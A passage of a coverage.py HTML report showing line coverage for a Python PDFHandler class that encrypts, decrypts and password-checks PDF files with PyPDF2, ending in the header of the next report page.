    <p class="mis show_mis"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t"><span class="key">except</span> <span class="nam">ImportError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t">    <span class="nam">PyPDF2</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t"><span class="key">class</span> <span class="nam">PDFHandler</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t"><span class="str">    PDF document encryption/decryption handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t"><span class="str">    Uses PyPDF2 for crypto operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">        <span class="key">if</span> <span class="nam">PyPDF2</span> <span class="key">is</span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">            <span class="key">raise</span> <span class="nam">ImportError</span><span class="op">(</span><span class="str">"PyPDF2 is required for PDF document processing"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">        <span class="com"># C2b_Config: Configure PDF Settings</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">encryption_method</span> <span class="op">=</span> <span class="str">'AES-256'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">user_password_length</span> <span class="op">=</span> <span class="num">128</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="str">"PDF handler initialized"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">    <span class="key">def</span> <span class="nam">configure</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">config</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t"><span class="str">        C2b: Configure PDF Handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t"><span class="str">        Set PDF-specific configuration options</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">encryption_method</span> <span class="op">=</span> <span class="nam">config</span><span class="op">.</span><span class="nam">get</span><span class="op">(</span><span class="str">'pdf_encryption_method'</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">encryption_method</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">user_password_length</span> <span class="op">=</span> <span class="nam">config</span><span class="op">.</span><span class="nam">get</span><span class="op">(</span><span class="str">'pdf_password_length'</span><span class="op">,</span> <span class="nam">self</span><span class="op">.</span><span class="nam">user_password_length</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">    <span class="key">def</span> <span class="nam">test_password</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">password</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t"><span class="str">        Test if password works for PDF document</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t"><span class="str">        Returns True if password is correct, False otherwise</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">                <span class="nam">pdf_reader</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfReader</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">                <span class="key">if</span> <span class="key">not</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">                    <span class="com"># PDF is not encrypted, so any password "works" for decryption</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">                    <span class="key">return</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">                <span class="com"># Try to decrypt with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">                <span class="nam">result</span> <span class="op">=</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">decrypt</span><span class="op">(</span><span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">                <span class="com"># PyPDF2 returns:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t">                <span class="com"># 0: Failed</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t">                <span class="com"># 1: Succeeded with user password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">                <span class="com"># 2: Succeeded with owner password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">                <span class="key">return</span> <span class="nam">result</span> <span class="op">></span> <span class="num">0</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">debug</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Password test failed for </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">    <span class="key">def</span> <span class="nam">encrypt_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">input_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">output_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">password</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t"><span class="str">        Encrypt PDF document with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t"><span class="str">        Full encryption support using PyPDF2</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">input_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">input_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">                <span class="nam">pdf_reader</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfReader</span><span class="op">(</span><span class="nam">input_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">                <span class="nam">pdf_writer</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfWriter</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">                <span class="com"># Copy all pages from input to output</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">                <span class="key">for</span> <span class="nam">page_num</span> <span class="key">in</span> <span class="nam">range</span><span class="op">(</span><span class="nam">len</span><span class="op">(</span><span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">pages</span><span class="op">)</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">                    <span class="nam">page</span> <span class="op">=</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">pages</span><span class="op">[</span><span class="nam">page_num</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">                    <span class="nam">pdf_writer</span><span class="op">.</span><span class="nam">add_page</span><span class="op">(</span><span class="nam">page</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">                <span class="com"># Encrypt the PDF with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">                <span class="nam">pdf_writer</span><span class="op">.</span><span class="nam">encrypt</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">                    <span class="nam">user_password</span><span class="op">=</span><span class="nam">password</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">                    <span class="nam">owner_password</span><span class="op">=</span><span class="nam">password</span><span class="op">,</span>  <span class="com"># Use same password for both</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">                    <span class="nam">use_128bit</span><span class="op">=</span><span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">                <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">                <span class="com"># Write encrypted PDF to output file</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">                <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">output_path</span><span class="op">,</span> <span class="str">'wb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">output_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">                    <span class="nam">pdf_writer</span><span class="op">.</span><span class="nam">write</span><span class="op">(</span><span class="nam">output_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Successfully encrypted </span><span class="op">{</span><span class="nam">input_path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t">            <span class="key">raise</span> <span class="nam">Exception</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to encrypt PDF </span><span class="op">{</span><span class="nam">input_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">    <span class="key">def</span> <span class="nam">decrypt_file</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">input_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">output_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">password</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t"><span class="str">        Decrypt PDF document with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t"><span class="str">        Full decryption support using PyPDF2</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">input_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">input_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t">                <span class="nam">pdf_reader</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfReader</span><span class="op">(</span><span class="nam">input_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">                <span class="key">if</span> <span class="key">not</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">                    <span class="com"># PDF is not encrypted, just copy it</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">                    <span class="key">import</span> <span class="nam">shutil</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t112" href="#t112">112</a></span><span class="t">                    <span class="nam">shutil</span><span class="op">.</span><span class="nam">copy2</span><span class="op">(</span><span class="nam">input_path</span><span class="op">,</span> <span class="nam">output_path</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t113" href="#t113">113</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">PDF </span><span class="op">{</span><span class="nam">input_path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst"> was not encrypted, copied as-is</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t114" href="#t114">114</a></span><span class="t">                    <span class="key">return</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t115" href="#t115">115</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t116" href="#t116">116</a></span><span class="t">                <span class="com"># Decrypt with password</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t117" href="#t117">117</a></span><span class="t">                <span class="nam">decrypt_result</span> <span class="op">=</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">decrypt</span><span class="op">(</span><span class="nam">password</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t118" href="#t118">118</a></span><span class="t">                <span class="key">if</span> <span class="nam">decrypt_result</span> <span class="op">==</span> <span class="num">0</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t">                    <span class="key">raise</span> <span class="nam">Exception</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Incorrect password for PDF </span><span class="op">{</span><span class="nam">input_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t">                <span class="com"># Create writer and copy all pages</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">                <span class="nam">pdf_writer</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfWriter</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">                <span class="key">for</span> <span class="nam">page_num</span> <span class="key">in</span> <span class="nam">range</span><span class="op">(</span><span class="nam">len</span><span class="op">(</span><span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">pages</span><span class="op">)</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t">                    <span class="nam">page</span> <span class="op">=</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">pages</span><span class="op">[</span><span class="nam">page_num</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t">                    <span class="nam">pdf_writer</span><span class="op">.</span><span class="nam">add_page</span><span class="op">(</span><span class="nam">page</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">                <span class="com"># Write decrypted PDF to output file</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">                <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">output_path</span><span class="op">,</span> <span class="str">'wb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">output_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">                    <span class="nam">pdf_writer</span><span class="op">.</span><span class="nam">write</span><span class="op">(</span><span class="nam">output_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">                <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">info</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Successfully decrypted </span><span class="op">{</span><span class="nam">input_path</span><span class="op">.</span><span class="nam">name</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">            <span class="key">raise</span> <span class="nam">Exception</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to decrypt PDF </span><span class="op">{</span><span class="nam">input_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">    <span class="key">def</span> <span class="nam">cleanup</span><span class="op">(</span><span class="nam">self</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t"><span class="str">        E2d: Call Handler Cleanup</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t"><span class="str">        Clean up any handler-specific resources</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t">        <span class="com"># PDF handler doesn't maintain persistent resources</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t143" href="#t143">143</a></span><span class="t">        <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_ae6ae744f2ec6f26_office_handler_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_ce21df766c911d41_file_handler_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_ce21df766c911d41___init___py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\core\__init__.py: 100%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\core\__init__.py</b>:
            <span class="pc_cov">100%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
